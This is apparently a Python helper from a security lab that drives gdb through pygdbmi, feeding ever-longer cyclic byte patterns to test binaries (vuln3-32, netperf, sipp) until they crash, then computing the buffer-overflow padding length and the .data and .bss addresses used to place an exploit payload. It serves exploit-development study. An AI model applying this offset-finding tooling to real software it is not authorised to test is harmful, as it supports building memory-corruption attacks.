# returns the junk data length, .data address and .bss address

from pygdbmi.gdbcontroller import GdbController
import re
import os


def get_addreses(gdb_response):
    _data = _bss = None
    for p in gdb_response:
        if p['payload'] is not None:
            if ".bss ALLOC" in p['payload']:
                _bss = int(re.findall(r'0x[0-9A-F]+', p['payload'], re.I)[0], 16)
            if ".data ALLOC" in p['payload']:
                _data = int(re.findall(r'0x[0-9A-F]+', p['payload'], re.I)[0], 16)
    return _data, _bss


def vul3_32(exe):
    slack = -254
    signal = response = data_address = bss_address = None
    b = []
    test_file = "test_file.bin"

    while signal != 'SIGSEGV':

        slack += 254
        for x in range(1, 255):
            b.extend([x, x, x, x])

        f = open(test_file, "wb")
        f.write(bytes(b))
        f.close()

        gdbmi = GdbController()
        gdbmi.write('file ' + exe)
        gdbmi.write('-break-insert main')
        gdbmi.write('-exec-arguments ' + test_file)
        gdbmi.write('-exec-run')
        response = gdbmi.write('maint info section')
        if data_address is None:
            (data_address, bss_address) = get_addreses(response)
        response = gdbmi.write('-exec-continue')

        if response[-1]['payload']['reason'] == 'signal-received':
            address = response[-1]['payload']['frame']['addr']
            if address[2:4] == address[4:6] or address[6:8] == address[8:]:
                signal = response[-1]['payload']['signal-name']
                # pprint(response)

    address = response[-1]['payload']['frame']['addr']
    length = ((int(address[8:], 16) - 1) + slack) * 4

    if int(address[8:], 16) != int(address[2:4], 16):
        length += 4
        i = 10
        while int(address[i - 2:i], 16) != int(address[2:4], 16):
            length -= 1
            i -= 2
    os.remove(test_file)
    return length, data_address, bss_address


def netperf(exe):
    slack = -254
    signal = response = data_address = bss_address = None
    b = []

    while signal != 'SIGSEGV':

        slack += 254

        print(slack);
        for x in range(1, 255):
            b.extend([x, x, x, x])

        arguments = "".join(map(chr, b))
        # if(slack * 4 > 7000):
        print(arguments)

        gdbmi = GdbController()
        gdbmi.write('file vulnerable_binaries/' + exe)
        gdbmi.write('-break-insert main')
        gdbmi.write('-exec-arguments -a \"' + arguments + '\"')
        gdbmi.write('-exec-run')
        response = gdbmi.write('maint info section')
        if data_address is None:
            (data_address, bss_address) = get_addreses(response)
        response = gdbmi.write('-exec-continue')

        if response[-1]['payload']['reason'] == 'signal-received':
            address = response[-1]['payload']['frame']['addr']
            print(address);
            if address[2:4] == address[4:6] or address[6:8] == address[8:]:
                signal = response[-1]['payload']['signal-name']
                # pprint(response)

    address = response[-1]['payload']['frame']['addr']
    length = ((int(address[8:], 16) - 1) + slack) * 4

    if int(address[8:], 16) != int(address[2:4], 16):
        length += 4
        i = 10
        while int(address[i - 2:i], 16) != int(address[2:4], 16):
            length -= 1
            i -= 2
    return length, data_address, bss_address


def get_everything(exe):
    if "vuln3-32" in exe:
        return vul3_32(exe)
    else:
        return netperf(exe)


def test():
    (padding, data, bss) = get_everything("sipp-3.3/sipp")  # original binary from the lab
    print(padding)
    print(hex(data))
    print(hex(bss))
    # assert (padding == 44)
    # assert (data == 0x80da060)
    # assert (bss == 0x80db320)


if __name__ == '__main__':
    test()
